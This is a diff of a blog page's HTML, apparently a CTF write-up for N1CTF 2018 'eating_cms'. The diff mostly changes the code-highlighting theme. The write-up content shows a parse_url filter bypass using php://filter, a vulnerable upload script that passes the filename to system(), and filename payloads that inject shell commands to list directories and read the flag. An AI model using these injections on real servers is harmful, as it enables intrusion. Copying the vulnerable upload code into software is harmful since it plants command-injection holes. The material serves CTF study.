@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -191,7 +199,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      338 字
+      274 字
     </span>
   
 
@@ -201,7 +209,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      12
+      9
        分钟
     </span>
   
@@ -240,24 +248,24 @@
             <div class="markdown-body">
               <h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><h4 id="parse-url-解析漏洞"><a href="#parse-url-解析漏洞" class="headerlink" title="parse_url()解析漏洞"></a><code>parse_url()</code>解析漏洞</h4><ul>
 <li><p><code>function.php</code>中</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function"></span>&#123;
-    $keywords = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];
-    $uri = parse_url($_SERVER[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);
-    parse_str($uri[<span class="hljs-string">&#x27;query&#x27;</span>], $query);
-<span class="hljs-comment">//    var_dump($query);</span>
-<span class="hljs-comment">//    die();</span>
-    <span class="hljs-keyword">foreach</span>($keywords <span class="hljs-keyword">as</span> $token)
-    &#123;
-        <span class="hljs-keyword">foreach</span>($query <span class="hljs-keyword">as</span> $k =&gt; $v)
-        &#123;
-            <span class="hljs-keyword">if</span> (stristr($k, $token))
-                hacker();
-            <span class="hljs-keyword">if</span> (stristr($v, $token))
-                hacker();
-        &#125;
-    &#125;
-&#125;</code></pre></div>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"manage"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ffffllllaaaaggg"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//    var_dump($query);</span>
+<span class="token comment">//    die();</span>
+    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></code></pre>
 
 <p><code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p>
 <p>这样就会被匹配到，不能读取；但是如果这样<code>///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code>parse_url就会返回<code>false</code>；读取成功。</p>
@@ -265,43 +273,43 @@
 <p><strong>漏洞问题只存在于php5.4.7以前</strong></p>
 <hr>
 <p>真正的上传地址<code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=m4aaannngggeee</code></p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-comment">//upllloadddd.php</span>
-<span class="hljs-meta">&lt;?php</span>
-$allowtype = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);
-$size = <span class="hljs-number">10000000</span>;
-$path = <span class="hljs-string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;
-$filename = $_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];
-<span class="hljs-keyword">if</span>(is_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;
-    <span class="hljs-keyword">if</span>(!move_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],$path.$filename))&#123;
-        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);
-    &#125;
-&#125;<span class="hljs-keyword">else</span>&#123;
-    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload file！&quot;</span>);
-&#125;
-$newfile = $path.$filename;
-<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success&lt;br /&gt;&quot;</span>;
-<span class="hljs-keyword">echo</span> $filename;
-$picdata = system(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.$filename.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);  		<span class="hljs-comment">//system命令执行，抓包改filename即可</span>
-<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.$picdata.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;
-<span class="hljs-keyword">if</span>($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;
-    unlink($newfile);
-    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);
-&#125;
-$ext = array_pop(explode(<span class="hljs-string">&quot;.&quot;</span>,$_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));
-<span class="hljs-keyword">if</span>(!in_array($ext,$allowtype))&#123;
-    unlink($newfile);
-&#125;
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<pre class="language-php" data-language="php"><code class="language-php">//upllloadddd.php
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"gif"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"png"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span>
+<span class="token variable">$path</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">;</span>
+<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:not an upload file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token double-quoted-string string">"file upload success&lt;br />"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
+<span class="token variable">$picdata</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">" | base64 -w 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  		<span class="token comment">//system命令执行，抓包改filename即可</span>
+<span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;img src='data:image/png;base64,"</span><span class="token punctuation">.</span><span class="token variable">$picdata</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"'>&lt;/img>"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'error'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span></code></pre>
 
 <p>payload：</p>
 <blockquote>
 <p><code>;cd ..;ls;#</code></p>
 <p><code>;cd ..;cat flag_233333;#</code></p>
 <p><strong><strong>****</strong></strong>或者*<strong><strong><strong><strong><strong>****</strong></strong></strong></strong></strong></p>
-<div class="hljs"><pre><code class="hljs php">|| `<span class="hljs-keyword">echo</span> bHMgLw== |base64 -d`
-		ls /
-|| `<span class="hljs-keyword">echo</span> Y2F0IC9mbGFnXzIzMzMzMyA= |base64 -d`
- 	cat /flag_233333</code></pre></div>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">||</span> `<span class="token keyword">echo</span> bHMgLw<span class="token operator">==</span> <span class="token operator">|</span>base64 <span class="token operator">-</span>d`
+		ls <span class="token operator">/</span>
+<span class="token operator">||</span> `<span class="token keyword">echo</span> Y2F0IC9mbGFnXzIzMzMzMyA<span class="token operator">=</span> <span class="token operator">|</span>base64 <span class="token operator">-</span>d`
+ 	cat <span class="token operator">/</span>flag_233333</code></pre>
 </blockquote>
 </li>
 </ul>
@@ -462,6 +470,8 @@ $ext = array_pop(explode(<span class="hljs-string">&quot;.&quot;</span>,$_FILES[
 
 
 
+  
+    
   
 
 
